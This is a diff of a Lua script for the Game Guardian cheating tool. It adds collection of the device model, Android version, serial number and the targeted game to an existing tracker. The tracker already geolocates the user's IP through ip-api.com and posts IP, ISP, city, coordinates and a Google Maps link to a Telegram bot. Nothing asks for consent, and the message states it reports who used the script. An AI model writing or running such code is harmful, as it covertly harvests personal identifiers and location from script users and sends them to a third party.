@@ -2,17 +2,35 @@
 local BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
 local CHAT_ID = "YOUR_CHAT_ID_HERE"
 
--- [[ JULES-CORE ADVANCED NOTIFIER ]]
--- Fitur: IP Tracking, Geolocation, Time/Date, Google Maps Link
+-- [[ JULES-CORE ULTIMATE NOTIFIER ]]
+-- Fitur: IP Tracking, Geolocation, Device Info, Game Detection, Time/Date
+
+local function get_device_info()
+    local info = gg.getTargetInfo()
+    local gameName = info and info.label or "Unknown Game"
+    local package = info and info.packageName or "Unknown Package"
+
+    -- Mengambil properti perangkat (Memerlukan Game Guardian versi terbaru)
+    local model = gg.getDeviceProperty('ro.product.model') or "Unknown Model"
+    local android = gg.getDeviceProperty('ro.build.version.release') or "Unknown"
+    local serial = gg.getDeviceProperty('ro.serialno') or "Unknown ID"
+
+    return {
+        game = gameName,
+        package = package,
+        model = model,
+        android = android,
+        id = serial
+    }
+end
 
 local function get_location()
-    gg.toast("Mengambil data lokasi akurat...")
-    -- Menggunakan ip-api.com newline format untuk parsing mudah tanpa library JSON
+    gg.toast("🛰️ Memperoleh koordinat lokasi...")
     local url = "http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query"
     local response = gg.makeRequest(url)
 
     if not response or response.code ~= 200 then
-        return nil, "Gagal mengambil data geolocation."
+        return nil
     end
 
     local lines = {}
@@ -20,78 +38,71 @@ local function get_location()
         table.insert(lines, line)
     end
 
-    if lines[1] ~= "success" then
-        return nil, "Layanan geolocation error."
-    end
+    if lines[1] ~= "success" then return nil end
 
     return {
-        country = lines[2] or "Tidak diketahui",
-        region  = lines[3] or "Tidak diketahui",
-        city    = lines[4] or "Tidak diketahui",
-        lat     = lines[5] or "0",
-        lon     = lines[6] or "0",
-        isp     = lines[7] or "Tidak diketahui",
-        ip      = lines[8] or "Tidak diketahui"
+        country = lines[2],
+        region  = lines[3],
+        city    = lines[4],
+        lat     = lines[5],
+        lon     = lines[6],
+        isp     = lines[7],
+        ip      = lines[8]
     }
 end
 
 local function send_report()
-    local timestamp_date = os.date("%Y-%m-%d")
-    local timestamp_time = os.date("%H:%M:%S")
+    local date = os.date("%Y-%m-%d")
+    local time = os.date("%H:%M:%S")
 
-    local loc, err = get_location()
+    local dev = get_device_info()
+    local loc = get_location()
 
-    local ip = loc and loc.ip or "Unknown"
-    local city = loc and loc.city or "Unknown"
-    local region = loc and loc.region or "Unknown"
-    local country = loc and loc.country or "Unknown"
-    local isp = loc and loc.isp or "Unknown"
-    local lat = loc and loc.lat or "0"
-    local lon = loc and loc.lon or "0"
+    local maps_link = "https://www.google.com/maps?q=" .. (loc and loc.lat or "0") .. "," .. (loc and loc.lon or "0")
 
-    local maps_link = "https://www.google.com/maps?q=" .. lat .. "," .. lon
-
-    -- Membangun pesan dengan format HTML untuk tampilan tabel yang rapi
-    local message = "<b>[ JULES-CORE SYSTEM REPORT ]</b>\n" ..
+    -- Design modern dengan ASCII Art Box dan format HTML
+    local message = "<b>🚀 [ JULES-CORE SYSTEM INTEGRATION ]</b>\n" ..
                     "<code>" ..
-                    "┌──────────────────────────────┐\n" ..
-                    "│ STATUS    : ACTIVE           │\n" ..
-                    "│ WAKTU     : " .. timestamp_time .. "         │\n" ..
-                    "│ TANGGAL   : " .. timestamp_date .. "       │\n" ..
-                    "├──────────────────────────────┤\n" ..
-                    "│ IP        : " .. ip .. "\n" ..
-                    "│ KOTA      : " .. city .. "\n" ..
-                    "│ WILAYAH   : " .. region .. "\n" ..
-                    "│ NEGARA    : " .. country .. "\n" ..
-                    "│ ISP       : " .. isp .. "\n" ..
-                    "├──────────────────────────────┤\n" ..
-                    "│ LAT       : " .. lat .. "\n" ..
-                    "│ LON       : " .. lon .. "\n" ..
-                    "└──────────────────────────────┘</code>\n\n" ..
-                    "📍 <b>Lokasi:</b> <a href=\"" .. maps_link .. "\">Buka di Google Maps</a>\n" ..
+                    "╔════════════════════════════════════╗\n" ..
+                    "║        SYSTEM STATUS: ONLINE       ║\n" ..
+                    "╠════════════════════════════════════╣\n" ..
+                    "║ DATE: " .. date .. " | TIME: " .. time .. " ║\n" ..
+                    "╠════════════════════════════════════╣\n" ..
+                    "║ > DEVICE INFORMATION               ║\n" ..
+                    "║ MODEL   : " .. dev.model .. "\n" ..
+                    "║ ANDROID : v" .. dev.android .. "\n" ..
+                    "║ ID      : " .. dev.id .. "\n" ..
+                    "╠════════════════════════════════════╣\n" ..
+                    "║ > SESSION INFORMATION              ║\n" ..
+                    "║ GAME    : " .. dev.game .. "\n" ..
+                    "║ PACKAGE : " .. dev.package .. "\n" ..
+                    "╠════════════════════════════════════╣\n" ..
+                    "║ > NETWORK & LOCATION               ║\n" ..
+                    "║ IP      : " .. (loc and loc.ip or "Unknown") .. "\n" ..
+                    "║ ISP     : " .. (loc and loc.isp or "Unknown") .. "\n" ..
+                    "║ CITY    : " .. (loc and loc.city or "Unknown") .. "\n" ..
+                    "║ COUNTRY : " .. (loc and loc.country or "Unknown") .. "\n" ..
+                    "╚════════════════════════════════════╝</code>\n\n" ..
+                    "📍 <b>Location Tracking:</b>\n" ..
+                    "└ <a href=\"" .. maps_link .. "\">Open in Google Maps</a>\n\n" ..
                     "<i>notifikasi script di gunakan oleh IP ini</i>"
 
     local tgUrl = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
+    local headers = { ["Content-Type"] = "application/json" }
 
-    -- Escape double quotes untuk body JSON
-    local escaped_message = message:gsub('"', '\\"')
-    -- Menghapus line breaks literal dan menggantinya dengan \n untuk JSON
-    escaped_message = escaped_message:gsub('\n', '\\n')
-
+    -- Escaping karakter untuk JSON payload
+    local escaped_message = message:gsub('"', '\\"'):gsub('\n', '\\n')
     local body = '{"chat_id": "' .. CHAT_ID .. '", "text": "' .. escaped_message .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'
 
-    gg.toast("Mengirim laporan ke Telegram...")
+    gg.toast("📡 Mengunggah data sesi...")
     local res = gg.makeRequest(tgUrl, headers, body)
 
     if res and res.code == 200 then
-        gg.alert("Laporan Sistem Berhasil Dikirim.\nIP: " .. ip)
+        gg.alert("✅ Laporan Sistem Berhasil Dikirim.\nGame: " .. dev.game)
     else
-        local error_info = "Gagal mengirim laporan."
-        if res then error_info = error_info .. " (Code: " .. res.code .. ")" end
-        gg.alert(error_info .. "\nPastikan Token & Chat ID sudah benar.")
+        local err = "❌ Gagal mengirim laporan."
+        if res then err = err .. " (Code: " .. res.code .. ")" end
+        gg.alert(err .. "\nPeriksa Token & Chat ID Anda.")
     end
 end
 
